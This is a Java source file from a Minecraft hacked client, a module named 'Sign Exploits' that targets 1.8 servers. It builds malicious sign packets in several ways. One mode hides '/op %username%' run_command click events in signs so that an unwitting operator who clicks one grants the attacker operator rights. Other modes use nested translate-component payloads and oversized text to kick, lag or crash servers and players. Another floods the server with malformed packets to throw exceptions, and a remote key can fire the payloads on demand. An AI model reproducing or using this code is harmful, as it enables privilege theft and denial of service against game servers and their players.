/*
 * This file is part of Vandalism - https://github.com/VandalismDevelopment/Vandalism
 * Copyright (C) 2023-2024 NekosAreKawaii, FooFieOwO and contributors
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

package de.nekosarekawaii.vandalism.feature.module.impl.exploit;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.viaversion.viaversion.api.protocol.version.ProtocolVersion;
import de.nekosarekawaii.vandalism.Vandalism;
import de.nekosarekawaii.vandalism.base.value.impl.misc.KeyBindValue;
import de.nekosarekawaii.vandalism.base.value.impl.number.IntegerValue;
import de.nekosarekawaii.vandalism.base.value.impl.primitive.BooleanValue;
import de.nekosarekawaii.vandalism.base.value.impl.primitive.StringValue;
import de.nekosarekawaii.vandalism.base.value.impl.selection.EnumModeValue;
import de.nekosarekawaii.vandalism.event.cancellable.network.IncomingPacketListener;
import de.nekosarekawaii.vandalism.event.cancellable.network.OutgoingPacketListener;
import de.nekosarekawaii.vandalism.event.normal.game.KeyboardInputListener;
import de.nekosarekawaii.vandalism.event.normal.network.DisconnectListener;
import de.nekosarekawaii.vandalism.event.normal.network.WorldListener;
import de.nekosarekawaii.vandalism.feature.module.AbstractModule;
import de.nekosarekawaii.vandalism.feature.script.parse.ScriptVariable;
import de.nekosarekawaii.vandalism.integration.viafabricplus.ViaFabricPlusAccess;
import de.nekosarekawaii.vandalism.util.common.IName;
import de.nekosarekawaii.vandalism.util.common.StringUtils;
import de.nekosarekawaii.vandalism.util.game.ChatUtil;
import net.minecraft.block.BlockState;
import net.minecraft.block.SignBlock;
import net.minecraft.block.WallSignBlock;
import net.minecraft.network.ClientConnection;
import net.minecraft.network.packet.c2s.play.UpdateSignC2SPacket;
import net.minecraft.network.packet.s2c.play.*;
import net.minecraft.text.Text;
import net.minecraft.util.Formatting;
import net.minecraft.util.math.BlockPos;
import net.raphimc.vialoader.util.VersionRange;
import org.lwjgl.glfw.GLFW;

import java.util.*;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.ThreadLocalRandom;
import java.util.concurrent.TimeUnit;

public class SignExploitsModule extends AbstractModule implements OutgoingPacketListener, IncomingPacketListener, KeyboardInputListener, WorldListener, DisconnectListener {

    private static final String KICK_COMPONENT = SignExploitsModule.assertAllowedSize(SignExploitsModule.generateHackTranslateComponent(SignExploitsModule.generateTranslatableComponent("options.snooper.desc"), 13, 8));
    private static final String CHUNK_RESET_COMPONENT = SignExploitsModule.assertAllowedSize(SignExploitsModule.generateHackTranslateComponent(SignExploitsModule.generateTranslatableComponent("options.snooper.desc"), 56, 8));
    private static final String CRASH_COMPONENT = SignExploitsModule.assertAllowedSize(SignExploitsModule.generateHackTranslateComponent(SignExploitsModule.generateTranslatableComponent("xd"), 5, 5, 5, 5, 5, 5, 5));
    private static final String LAG_COMPONENT = SignExploitsModule.assertAllowedSize(SignExploitsModule.generateHackTranslateComponent(SignExploitsModule.generateTranslatableComponent("options.snooper.desc"), 16, 6));
    private static final String EMPTY_STRING_COMPONENT = "\"\"";

    private final EnumModeValue<Mode> mode = new EnumModeValue<>(
            this,
            "Mode",
            "Change the mode.",
            Mode.COLOR_BYPASS,
            Mode.values()
    );

    private final EnumModeValue<UpdateSchedule> updateSchedule = new EnumModeValue<>(
            this,
            "Update schedule",
            "Change the sign update schedule.",
            UpdateSchedule.GUI_CLOSE,
            UpdateSchedule.values()
    );

    private final IntegerValue updateDelay = new IntegerValue(
            this,
            "Update delay",
            "Delay to wait after update scheduled.",
            0,
            0,
            10
    ).visibleCondition(() -> this.updateSchedule.getValue() == UpdateSchedule.PLACE);

    private final KeyBindValue remoteKeyBind = new KeyBindValue(
            this,
            "Remote key bind",
            "Trigger sign exploit remotely via the given key bind.",
            GLFW.GLFW_KEY_UP
    ).visibleCondition(() -> this.updateSchedule.getValue() == UpdateSchedule.REMOTE);

    private final BooleanValue triggerOnDestroyAttempt = new BooleanValue(
            this,
            "Trigger remotely on destroy attempt",
            "Trigger the sign exploit remotely on destroy attempt",
            false
    ).visibleCondition(() -> this.updateSchedule.getValue() == UpdateSchedule.REMOTE);

    private final BooleanValue remoteInfoChatMessage = new BooleanValue(
            this,
            "Remote info chat message",
            "Enable / Disable info chat message on remote trigger.",
            true
    ).visibleCondition(() -> this.updateSchedule.getValue() == UpdateSchedule.REMOTE);

    private final StringValue line1Command = new StringValue(
            this,
            "Line 1 Command",
            "The command to run when the first line of the command sign is clicked.",
            "/op %username%"
    ).visibleCondition(() -> this.mode.getValue() == Mode.COMMAND);

    private final StringValue line2Command = new StringValue(
            this,
            "Line 2 Command",
            "The command to run when the first line of the command sign is clicked.",
            "/op %username%"
    ).visibleCondition(() -> this.mode.getValue() == Mode.COMMAND);

    private final StringValue line3Command = new StringValue(
            this,
            "Line 3 Command",
            "The command to run when the first line of the command sign is clicked.",
            "/op %username%"
    ).visibleCondition(() -> this.mode.getValue() == Mode.COMMAND);

    private final StringValue line4Command = new StringValue(
            this,
            "Line 4 Command",
            "The command to run when the first line of the command sign is clicked.",
            "/op %username%"
    ).visibleCondition(() -> this.mode.getValue() == Mode.COMMAND);

    private final IntegerValue characterCount = new IntegerValue(
            this,
            "Character Count",
            "The amount of characters to put into every line of the lag sign.",
            32000,
            1000,
            128000
    ).visibleCondition(() -> this.mode.getValue() == Mode.LAG_1);

    private final IntegerValue exceptionCount = new IntegerValue(
            this,
            "Exception Count",
            "The amount of exceptions that should be thrown server-side.",
            10,
            1,
            100
    ).visibleCondition(() -> this.mode.getValue() == Mode.EXCEPTION);

    private enum Mode implements IName {
        COLOR_BYPASS, LAG_1, LAG_2, COMMAND, KICK, CHUNK_RESET, EXCEPTION, CRASH;

        private final String name;

        Mode() {
            this.name = StringUtils.normalizeEnumName(this.name());
        }

        @Override
        public String getName() {
            return this.name;
        }
    }

    private enum UpdateSchedule implements IName {
        GUI_CLOSE, PLACE, REMOTE;

        private final String name;

        UpdateSchedule() {
            this.name = StringUtils.normalizeEnumName(this.name());
        }

        @Override
        public String getName() {
            return this.name;
        }
    }

    private final Stack<BlockPos> scheduledSigns;
    private final List<BlockPos> ignoreSigns;

    public SignExploitsModule() {
        super(
                "Sign Exploits",
                "Various exploits that use signs for example 1.8.0 force op.",
                Category.EXPLOIT,
                VersionRange.single(ProtocolVersion.v1_8)
        );
        this.scheduledSigns = new Stack<>();
        this.ignoreSigns = new ArrayList<>();
    }

    @Override
    public void onActivate() {
        Vandalism.getInstance().getEventSystem().subscribe(this, OutgoingPacketEvent.ID, IncomingPacketEvent.ID, KeyboardInputEvent.ID, WorldLoadEvent.ID, DisconnectEvent.ID);
    }

    @Override
    public void onDeactivate() {
        Vandalism.getInstance().getEventSystem().unsubscribe(this, OutgoingPacketEvent.ID, IncomingPacketEvent.ID, KeyboardInputEvent.ID, WorldLoadEvent.ID, DisconnectEvent.ID);
    }

    @Override
    public void onKeyInput(final long window, final int key, final int scanCode, final int action, final int modifiers) {
        if (this.updateSchedule.getValue() == UpdateSchedule.REMOTE && action == GLFW.GLFW_PRESS && this.remoteKeyBind.isPressed(key)) {
            if (this.scheduledSigns.empty())
                return;

            final BlockPos signPos = this.scheduledSigns.pop();
            SignExploitsModule.sendSignUpdate(mc.player.networkHandler.getConnection(), signPos);
            if (this.remoteInfoChatMessage.getValue()) {
                ChatUtil.infoChatMessage("Remotely triggered sign exploit at position (".concat(signPos.toShortString()).concat(")"));
            }
        }
    }

    @Override
    public void onDisconnect(final ClientConnection clientConnection, final Text disconnectReason) {
        this.clear();
    }

    @Override
    public void onPreWorldLoad() {
        this.clear();
    }

    private void clear() {
        this.scheduledSigns.clear();
        this.ignoreSigns.clear();
    }

    @Override
    public void onIncomingPacket(final IncomingPacketEvent event) {
        if (event.packet instanceof final BlockEntityUpdateS2CPacket packet) {
            final BlockPos pos = packet.getPos();
            if (this.ignoreSigns.contains(pos)) {
                event.cancel();
            }
        }


        if (event.packet instanceof BlockUpdateS2CPacket packet) {
            this.onRemove(packet.getPos(), packet.getState());
        }

        if (event.packet instanceof final ChunkDeltaUpdateS2CPacket packet) {
            packet.visitUpdates(this::onRemove);
        }

        if (this.updateSchedule.getValue() == UpdateSchedule.REMOTE) {
            if (this.triggerOnDestroyAttempt.getValue() && event.packet instanceof final BlockBreakingProgressS2CPacket packet && packet.getProgress() > 0) {
                final BlockPos pos = packet.getPos();
                if (this.scheduledSigns.contains(pos)) {
                    this.scheduledSigns.remove(pos);
                    SignExploitsModule.sendSignUpdate(event.connection, pos);
                    if (this.remoteInfoChatMessage.getValue()) {
                        ChatUtil.infoChatMessage("Remotely triggered sign exploit at position (".concat(pos.toShortString()).concat(") because of destroy attempt."));
                    }
                }
            }
        }

        if (event.packet instanceof final SignEditorOpenS2CPacket packet) {
            switch (this.updateSchedule.getValue()) {
                case PLACE -> {
                    final Runnable runnable = () -> SignExploitsModule.sendSignUpdate(event.connection, packet.getPos());
                    final int delay = this.updateDelay.getValue();
                    if (delay <= 0) {
                        runnable.run();
                    } else {
                        CompletableFuture.delayedExecutor(delay, TimeUnit.SECONDS).execute(() -> {
                            if (mc.player != null && event.connection.isOpen()) {
                                runnable.run();
                            }
                        });
                    }
                }
                case REMOTE -> {
                    this.scheduledSigns.removeIf(pos -> Objects.equals(pos, packet.getPos()));
                    this.scheduledSigns.push(packet.getPos());
                }
                default -> {
                    return;
                }
            }
            event.cancel();
        }
    }

    private static void sendSignUpdate(final ClientConnection connection, final BlockPos pos) {
        connection.send(new UpdateSignC2SPacket(pos, true, "", "", "", ""));
    }

    private void onRemove(final BlockPos pos, final BlockState state) {
        if (!(state.getBlock() instanceof SignBlock) && !(state.getBlock() instanceof WallSignBlock)) {
            if (this.scheduledSigns.contains(pos)) {
                this.scheduledSigns.remove(pos);
                if (this.remoteInfoChatMessage.getValue()) {
                    ChatUtil.warningChatMessage("Sign removed at (".concat(pos.toShortString()).concat(") because block was destroyed!"));
                }
            }
            this.ignoreSigns.remove(pos);
        }
    }

    @Override
    public void onOutgoingPacket(final OutgoingPacketEvent event) {
        if (event.packet instanceof final UpdateSignC2SPacket packet) {
            final BlockPos pos = packet.getPos();
            final String[] text = packet.getText();

            switch (this.mode.getValue()) {
                case COLOR_BYPASS -> {
                    final String[] newText = new String[4];
                    final String prefix = String.valueOf(Formatting.FORMATTING_CODE_PREFIX);
                    for (int i = 0; i < text.length; i++) {
                        for (final Formatting formatting : Formatting.values()) {
                            String textLine = text[i];
                            final String code = String.valueOf(formatting.getCode());
                            final String colorCode = prefix + code;
                            if (textLine.contains(colorCode)) {
                                textLine = textLine.replace(
                                        colorCode, prefix + prefix + code + code
                                );
                            }
                            newText[i] = textLine;
                        }
                    }
                    event.packet = new UpdateSignC2SPacket(pos, true, newText[0], newText[1], newText[2], newText[3]);
                }
                case LAG_1 -> {
                    final String lagText;
                    {
                        final JsonObject component = new JsonObject();
                        component.addProperty("text", "x".repeat(this.characterCount.getValue()));
                        lagText = component.toString();
                    }
                    this.ignoreSigns.add(pos);
                    ViaFabricPlusAccess.send1_8SignUpdatePacket(
                            pos,
                            lagText,
                            lagText,
                            lagText,
                            lagText
                    );
                    event.cancel();
                }
                case LAG_2 -> {
                    this.ignoreSigns.add(pos);
                    ViaFabricPlusAccess.send1_8SignUpdatePacket(
                            pos,
                            SignExploitsModule.LAG_COMPONENT,
                            SignExploitsModule.LAG_COMPONENT,
                            SignExploitsModule.LAG_COMPONENT,
                            SignExploitsModule.LAG_COMPONENT
                    );
                    event.cancel();
                }
                case COMMAND -> {
                    ViaFabricPlusAccess.send1_8SignUpdatePacket(
                            pos,
                            SignExploitsModule.generateCommandComponent(text[0], ScriptVariable.applyReplacements(this.line1Command.getValue())).toString(),
                            SignExploitsModule.generateCommandComponent(text[1], ScriptVariable.applyReplacements(this.line2Command.getValue())).toString(),
                            SignExploitsModule.generateCommandComponent(text[2], ScriptVariable.applyReplacements(this.line3Command.getValue())).toString(),
                            SignExploitsModule.generateCommandComponent(text[3], ScriptVariable.applyReplacements(this.line4Command.getValue())).toString()
                    );
                    event.cancel();
                }
                case KICK -> {
                    ViaFabricPlusAccess.send1_8SignUpdatePacket(
                            pos,
                            SignExploitsModule.KICK_COMPONENT,
                            SignExploitsModule.EMPTY_STRING_COMPONENT,
                            SignExploitsModule.EMPTY_STRING_COMPONENT,
                            SignExploitsModule.EMPTY_STRING_COMPONENT
                    );
                    event.cancel();
                }
                case CHUNK_RESET -> {
                    ViaFabricPlusAccess.send1_8SignUpdatePacket(
                            pos,
                            SignExploitsModule.CHUNK_RESET_COMPONENT,
                            SignExploitsModule.CHUNK_RESET_COMPONENT,
                            SignExploitsModule.CHUNK_RESET_COMPONENT,
                            SignExploitsModule.CHUNK_RESET_COMPONENT
                    );
                    event.cancel();
                }
                case EXCEPTION -> {
                    for (int i = 0; i < this.exceptionCount.getValue(); i++) {
                        final String[] lines = new String[4];
                        Arrays.fill(lines, SignExploitsModule.EMPTY_STRING_COMPONENT);
                        lines[ThreadLocalRandom.current().nextInt(lines.length)] = "";

                        ViaFabricPlusAccess.send1_8SignUpdatePacket(
                                pos,
                                lines[0],
                                lines[1],
                                lines[2],
                                lines[3]
                        );
                    }
                    event.cancel();
                }
                case CRASH -> {
                    ViaFabricPlusAccess.send1_8SignUpdatePacket(
                            pos,
                            SignExploitsModule.CRASH_COMPONENT,
                            SignExploitsModule.CRASH_COMPONENT,
                            SignExploitsModule.CRASH_COMPONENT,
                            SignExploitsModule.CRASH_COMPONENT
                    );
                    event.cancel();
                }
            }
        }
    }

    private static JsonObject generateCommandComponent(final String text, final String command) {
        final JsonObject component = new JsonObject();
        component.addProperty("text", text);
        {
            final JsonObject clickEvent = new JsonObject();
            clickEvent.addProperty("action", "run_command");
            clickEvent.addProperty("value", command);
            component.add("clickEvent", clickEvent);
        }
        return component;
    }

    private static JsonObject generateHackTranslateComponent(final int repeat, final JsonObject child) {
        final JsonObject json = new JsonObject();
        json.addProperty("translate", "%1$s".repeat(repeat));
        final JsonArray with = new JsonArray();
        with.add(child);
        json.add("with", with);
        return json;
    }

    private static JsonObject generateTranslatableComponent(final String translate) {
        final JsonObject component = new JsonObject();
        component.addProperty("translate", translate);
        return component;
    }

    private static JsonObject generateHackTranslateComponent(final JsonObject finalizer, final int... repeats) {
        return SignExploitsModule.generateHackTranslateComponent(0, finalizer, repeats);
    }

    private static JsonObject generateHackTranslateComponent(final int offset, final JsonObject finalizer, final int... repeats) {
        return SignExploitsModule.generateHackTranslateComponent(repeats[offset], offset + 1 >= repeats.length ? finalizer : SignExploitsModule.generateHackTranslateComponent(offset + 1, finalizer, repeats));
    }

    private static String assertAllowedSize(final JsonObject object) {
        final String value = object.toString();
        if (value.length() > 384)
            throw new IllegalArgumentException("Size exceeded max allowed packet size.");

        return value;
    }

}